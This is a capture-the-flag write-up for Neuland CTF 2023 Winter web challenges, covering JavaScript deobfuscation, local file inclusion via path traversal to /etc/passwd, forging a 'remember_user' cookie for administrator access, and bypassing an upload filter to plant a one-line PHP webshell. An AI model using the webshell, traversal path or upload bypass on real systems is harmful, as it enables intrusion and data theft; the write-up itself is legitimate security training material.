---
title: "Neuland CTF 2023 Winter - Web"
authors: ["Neuland CTF Orga"]
date: 2023-12-09T21:00
published: true
tags:
- CTF
- Writeup
- Cybersecurity
---

</br>

Download challenges: [Neuland CTF Repository](https://github.com/neuland-ingolstadt/Neuland-CTF-2023-Winter)

</br>

## Obfuscation 1 - Easy
[Obfuscation-1.js](/files/neuland-ctf-12-2023/Obfuscation-1.js)

</br>

The title of the challenge already gives us an indication of the correct solution. Obfuscation is used in programming to make source code more difficult for humans to read and to prevent recovery. If we look at the obfuscated JavaScript file, the first thing that catches our eye is an array with several strings. Based on the backslashes and format, this is ASCII code presented in hexadecimal format. Luckily this encoding is machine friendly, and our browser can handle it very well; a simple console.log decodes the strings into human-readable words. The string ***\x6E\x6C\x61\x6E\x64\x7B*** is translated to ***nland{***. We seem to be on the right track. The dinge() function appears to put our encoded strings in the correct order and stores them in the const flag. To capture the flag, we must run the dinge() function and print the resulting array.

</br>

![](../src/blog/images/neuland-ctf-12-2023/dinge().webp)

</br>

The flag is `nlan{no7_sur3_1F_F1Rs7_y34R_pro9R4MM3R_oR_o8fUsc473d_m4lw4R3}`.

</br>

## Obfuscation 2 - Hard
[Obfuscation-2.js](/files/neuland-ctf-12-2023/Obfuscation-2.js)

</br>

We downloaded another obfuscated JavaScript file, but the attackers tried harder this time. An excellent first step for deobfuscation is reindenting the code to make it more manageable. [JS Beautifier](https://beautifier.io/) can automatically do this.

```
const _0x1a485f = _0x581a;
(function(_0x1c6eb8, _0x395e1d) {
    const _0x1b6513 = _0x581a,
        _0x286a98 = _0x1c6eb8();
    while (!![]) {
        try {
            const _0x192a3f = -parseInt(_0x1b6513(0x1b0)) / 0x1 * (-parseInt(_0x1b6513(0x1a9)) / 0x2) + parseInt(_0x1b6513(0x1ae)) / 0x3 * (parseInt(_0x1b6513(0x197)) / 0x4) + -parseInt(_0x1b6513(0x1a8)) / 0x5 + parseInt(_0x1b6513(0x19f)) / 0x6 + parseInt(_0x1b6513(0x1a3)) / 0x7 * (parseInt(_0x1b6513(0x1a0)) / 0x8) + parseInt(_0x1b6513(0x1ac)) / 0x9 + -parseInt(_0x1b6513(0x19c)) / 0xa * (parseInt(_0x1b6513(0x1b2)) / 0xb);
            if (_0x192a3f === _0x395e1d) break;
            else _0x286a98['push'](_0x286a98['shift']());
        } catch (_0xda03d6) {
            _0x286a98['push'](_0x286a98['shift']());
        }
    }
}(_0x2aa2, 0x72055));
const flag = [_0x1a485f(0x1a4), _0x1a485f(0x1ab), _0x1a485f(0x199), _0x1a485f(0x1b1), 'bj]CpKN'];

function dB(_0x59ce1d) {
    const _0x3e06ca = _0x1a485f;
    return _0x59ce1d = _0x59ce1d['split']('\x20')[_0x3e06ca(0x1a6)](_0x419c14 => parseInt(_0x419c14, 0x2)), _0x59ce1d = _0x59ce1d['map'](_0x31611a => String[_0x3e06ca(0x1af)](_0x31611a)), _0x59ce1d['join']('');
}

function dz(_0x286a45) {
    const _0x38a4b9 = _0x1a485f,
        _0xcb853b = _0x38a4b9(0x1a7),
        _0x209279 = _0x38a4b9(0x1a5);
    return _0x286a45[_0x38a4b9(0x19e)](/[a-z]/gi, _0x36e926 => _0x209279[_0xcb853b[_0x38a4b9(0x19a)](_0x36e926)]);
}

function _0x2aa2() {
    const _0x2d4cd4 = ['map', 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', '1156205WagVKr', '1260RFQtqp', 'error', '08SHFpnG10A_', '4218561dhoEbd', 'exec\x20error:\x20', '153jgKQxa', 'fromCharCode', '1409LGyxiN', '01000101\x2001111000\x2000110000\x2001110100\x2000110001\x2001100011\x2001011111', '7017538BrATap', '46472aYBnTL', 'stdout:\x20', 'MFJf', 'indexOf', 'echo\x20flag[0]\x20+\x20dz(flag[1])\x20+\x20atob(flag[2])\x20+\x20dB(flag[3])\x20+\x20x(flag[4],\x221337\x22)', '30pzCcOH', 'log', 'replace', '3225444gkeAsx', '1005224nOyLpZ', 'substr', 'length', '7ojfOlB', 'nland{', 'nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM'];
    _0x2aa2 = function() {
        return _0x2d4cd4;
    };
    return _0x2aa2();
}

function x(_0x2d67b9, _0x3c3c8d) {
    const _0x1eb2cc = _0x1a485f;
    var _0xbd0689 = [],
        _0x3bf2b8 = '',
        _0x1732c4;
    for (_0x1732c4 = 0x1; _0x1732c4 <= 0xff; _0x1732c4++) {
        _0xbd0689[String[_0x1eb2cc(0x1af)](_0x1732c4)] = _0x1732c4;
    }
    for (_0x1732c4 = 0x0; _0x1732c4 < _0x2d67b9[_0x1eb2cc(0x1a2)]; _0x1732c4++) _0x3bf2b8 += String[_0x1eb2cc(0x1af)](_0xbd0689[_0x2d67b9[_0x1eb2cc(0x1a1)](_0x1732c4, 0x1)] ^ _0xbd0689[_0x3c3c8d['substr'](_0x1732c4 % _0x3c3c8d[_0x1eb2cc(0x1a2)], 0x1)]);
    return _0x3bf2b8;
}

function _0x581a(_0xa2c34d, _0x190ced) {
    const _0x2aa261 = _0x2aa2();
    return _0x581a = function(_0x581a17, _0x495af2) {
        _0x581a17 = _0x581a17 - 0x197;
        let _0x3bab4d = _0x2aa261[_0x581a17];
        return _0x3bab4d;
    }, _0x581a(_0xa2c34d, _0x190ced);
}
const {
    exec
} = require('child_process');
exec(_0x1a485f(0x19b), (_0x263a24, _0x52884b, _0x2840ed) => {
    const _0x353310 = _0x1a485f;
    if (_0x263a24) {
        console[_0x353310(0x1aa)](_0x353310(0x1ad) + _0x263a24);
        return;
    }
    console[_0x353310(0x19d)](_0x353310(0x198) + _0x52884b), console[_0x353310(0x1aa)]('stderr:\x20' + _0x2840ed);
});
```

A common obfuscation tactic is to rename variables as confusing as possible. All strings starting with ***0x*** can be converted to decimal. The ***0x*** indicates that the notation is hexadecimal. So ***0x1*** is a ***1*** in the decimal notation we are more familiar with. The const flag would change to 

```
const flag = [_0x1a485f(420), _0x1a485f(427), _0x1a485f(409), _0x1a485f(433), 'bj]CpKN'];
```

Another tactic is renaming functions and variables throughout the code, which we'll unify and rename to something more meaningful. The most notable variable is the const with the name flag, which contains several ***_0x519bb8*** functions with different parameters. We´ll rename the function to ***flag_func***. The function is also referenced under the name ***_0x3e06ca, _0x38a4b9, _0x1eb2cc, _0x353310, _0x581a, _0x1b6513, _0x581a*** and ***_0x1b6513***. The exact process should be done with the const ***_0x2aa2***; in our example, it is converted to ***array_func***. In the next step, we resolve flag_func. The function takes the numeric parameter and subtracts the value ***407***; the resulting number is used as the index for the const array_func. After replacing the values, we get code similar to what an [online deobfuscator](https://deobfuscate.relative.im/) can automatically achieve. 

```
const flag = [
  'nland{',
  '08SHFpnG10A_',
  'MFJf',
  '01000101 01111000 00110000 01110100 00110001 01100011 01011111',
  'bj]CpKN',
]
function dB(_0x59ce1d) {
  return (
    (_0x59ce1d = _0x59ce1d
      .split(' ')
      .map((_0x419c14) => parseInt(_0x419c14, 2))),
    (_0x59ce1d = _0x59ce1d.map((_0x31611a) => String.fromCharCode(_0x31611a))),
    _0x59ce1d.join('')
  )
}
function dz(_0x286a45) {
  const _0xcb853b = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
    _0x209279 = 'nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM'
  return _0x286a45.replace(
    /[a-z]/gi,
    (_0x36e926) => _0x209279[_0xcb853b.indexOf(_0x36e926)]
  )
}
function x(_0x2d67b9, _0x3c3c8d) {
  var _0xbd0689 = [],
    _0x3bf2b8 = '',
    _0x1732c4
  for (_0x1732c4 = 1; _0x1732c4 <= 255; _0x1732c4++) {
    _0xbd0689[String.fromCharCode(_0x1732c4)] = _0x1732c4
  }
  for (_0x1732c4 = 0; _0x1732c4 < _0x2d67b9.length; _0x1732c4++) {
    _0x3bf2b8 += String.fromCharCode(
      _0xbd0689[_0x2d67b9.substr(_0x1732c4, 1)] ^
        _0xbd0689[_0x3c3c8d.substr(_0x1732c4 % _0x3c3c8d.length, 1)]
    )
  }
  return _0x3bf2b8
}
const { exec } = require('child_process')
exec(
  'echo flag[0] + dz(flag[1]) + atob(flag[2]) + dB(flag[3]) + x(flag[4],"1337")',
  (_0x263a24, _0x52884b, _0x2840ed) => {
    if (_0x263a24) {
      console.error('exec error: ' + _0x263a24)
      return
    }
    console.log('stdout: ' + _0x52884b)
    console.error('stderr: ' + _0x2840ed)
  }
)
```

Now that the code looks much more manageable, we can figure out what it does. The last line indicates that the JavaScript file is trying to execute shellcode via the exec command; this is a good entry point to decipher the rest of the code's functionality. In the first part, the index 0 is fetched from the const flag, corresponding to ***nland{***. The second section decrypts the string ***08SHFpnG10A_***  with the function dz, which equals a ROT13 and results in ***08FUScaT10N_***. The third part decodes ***MFJf*** as ***0R_*** with the BASE64 function atob. The dB function translates the next section as ***Ex0t1c_***. It converts a binary string back into its raw human-readable form. The last piece can be decrypted to ***SYntAx}*** with XOR and the password ***1337***.

The original code can be viewed below:

```
const flag = ["nland{", "08SHFpnG10A_", "MFJf", "01000101 01111000 00110000 01110100 00110001 01100011 01011111", "bj]CpKN"]

function dB(b) { //Binary
    b = b.split(' ').map(elem => parseInt(elem,2))
    b = b.map(elem => String.fromCharCode(elem))
    return b.join("")
}

function dz(m) { //ROT13
      const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
  const cipher = "nopqrstuvwxyzabcdefghijklmNOPQRSTUVWXYZABCDEFGHIJKLM"
  return m.replace(/[a-z]/gi, letter => cipher[alphabet.indexOf(letter)])
}

function x(m, key) //XOR
{
   var ord = []; var res = ""; var i;

   for (i = 1; i <= 255; i++) {ord[String.fromCharCode(i)] = i}

   for (i = 0; i < m.length; i++)
       res += String.fromCharCode(ord[m.substr(i, 1)] ^ ord[key.substr(i % key.length, 1)]);

   return(res);
}

const { exec } = require('child_process');

exec('echo flag[0] + dz(flag[1]) + atob(flag[2]) + dB(flag[3]) + x(flag[4],"1337")', (error, stdout, stderr) => {
  if (error) {
    console.error(`exec error: ${error}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);
});
```

The flag is `nland{08FUScaT10N_0R_Ex0t1c_SYntAx}`.

<br>

## InfoSec Academy - Easy
Author: [Fabi](https://github.com/fabifighter007)</br>

*At InfoSec Academy, we are dedicated to shaping the next generation of cybersecurity professionals. Our mission is to empower individuals with the knowledge, skills, and expertise needed to navigate the dynamic and ever-evolving world of digital security.*

We see a website advertising IT security courses. 

<br>

![](../src/blog/images/neuland-ctf-12-2023/infosec1.webp)

<br>

We notice the contact form that can be sent, but this does not lead to success. 

<br>

![](../src/blog/images/neuland-ctf-12-2023/infosec2.webp)


<br>

![](../src/blog/images/neuland-ctf-12-2023/infosec3.webp)

<br>

In the URL, we see that pages are embedded via the file parameter. Local File Inclusion (LFI) is a vulnerability that allows an attacker to include files from a local system or server directory. To check if the site is vulnerable to LFI, we try to include the file `/etc/passwd`.

<br>

![](../src/blog/images/neuland-ctf-12-2023/infosec4.webp)

<br>

We can find the user `infosec-academy` through the passwd file. Now, we are able to read the flag located in the user's home directory by including the file `../../../../../home/infosec-academy/flag.txt`.

<br>

![](../src/blog/images/neuland-ctf-12-2023/infosec5.webp)

<br>

The flag is `nland{Info5eC_acaDemY_h0peS_yOuR_$tAY_On_0Ur_hOMeP@9e_Wa5_p1EaS4nt}`.

<br>

## Digital Odyssey - Medium
Author: [Fabi](https://github.com/fabifighter007)</br>

*Greetings, stranger. You've been granted provisional access to our secret club. To start, simply log in with the username "guest" and the password "guest". Your journey through the digital odyssey begins now. Proceed with curiosity.*

We were invited to a secret club. 

<br>

![](../src/blog/images/neuland-ctf-12-2023/odyssey1.webp)

<br>

Fortunately, we have been sent login data with which we can log in. We find a terminal in which we can enter commands. Unfortunately, none of the commands entered are recognized and nothing is sent to the server, which is why we assume a dead end.

<br>

![](../src/blog/images/neuland-ctf-12-2023/odyssey4.webp)

<br>

Let's take a closer look at the login window. Here we have the option of using the `Remember Me` field. 

<br>

![](../src/blog/images/neuland-ctf-12-2023/odyssey3.webp)

<br>

After we have logged in again, we can discover a cookie named `remember_user`. 

<br>

![](../src/blog/images/neuland-ctf-12-2023/odyssey5.webp)

<br>

The value of the cookie can be decoded with the help of CyberChef.

<br>

![](../src/blog/images/neuland-ctf-12-2023/odyssey6.webp)

<br>

Previously we were told that only the administrator knows the mystery. Therefore, we will now build a token that gives us access to the account `administrator`.

<br>

![](../src/blog/images/neuland-ctf-12-2023/odyssey7.webp)

<br>

Finally, we just need to set the generated token as cookie `remember_user`, which will give us access to the account `administrator`.

<br>

![](../src/blog/images/neuland-ctf-12-2023/odyssey8.webp)

<br>

The flag is `nland{yOu_ArE_N0t_OuR_aDMinI5tr4T0r!}`.

<br>

## Review - Hard
Author: [Fabi](https://github.com/fabifighter007)</br>

*On the page we find a review form.*

<br>

![](../src/blog/images/neuland-ctf-12-2023/upload1.webp)

<br>

To see what happens after the form is submitted, we use [Burp Suite](https://portswigger.net/burp). We notice that we can submit username, review, number of stars and a photo.

<br>

![](../src/blog/images/neuland-ctf-12-2023/upload2.webp)

<br>

When we examine the HTML code of the page, we find that the image on the default page is hosted in the 'uploads' folder. Here we also find our previously uploaded images. 
If we successfully upload PHP code, it will also end up in the uploads folder and become accessible on the web server, potentially enabling us to execute code on the target system. Unfortunately, we realize that we cannot upload a php file because the server filters it out. We therefore use Burp's Intruder to automatically search for possible filenames in order to bypass the filter. In addition, we modify the filename, the Content-Type and [File Magic Numbers](https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5) to imitate a image:

<br>

![](../src/blog/images/neuland-ctf-12-2023/upload3.webp)

<br>

Furthermore, we set the content of the 'image' to a webshell:

```
<?php system($_REQUEST['cmd']); ?>
```

After some fuzzing, we were able to upload a file named shell.webp.Php. Now, we can visit `http://78.46.78.30:1094/uploads/upload1.webp.Php?cmd=ls` to view the contents of the previously identified uploads directory. 

<br>

![](../src/blog/images/neuland-ctf-12-2023/upload4.webp)

<br>

We find the flag within the `home` directory.

<br>

![](../src/blog/images/neuland-ctf-12-2023/upload5.webp)

<br>

The flag is `nland{tHANks_4_Ur_fE3DBAck}`.
